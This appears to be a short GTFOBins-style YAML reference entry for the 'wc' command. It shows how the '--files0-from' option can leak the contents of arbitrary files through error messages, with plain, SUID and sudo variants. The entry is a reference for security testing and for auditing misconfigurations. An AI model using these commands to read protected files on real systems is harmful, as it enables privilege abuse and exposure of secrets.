---
description: The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        wc --files0-from "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./wc --files0-from "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo wc --files0-from "$LFILE"
---
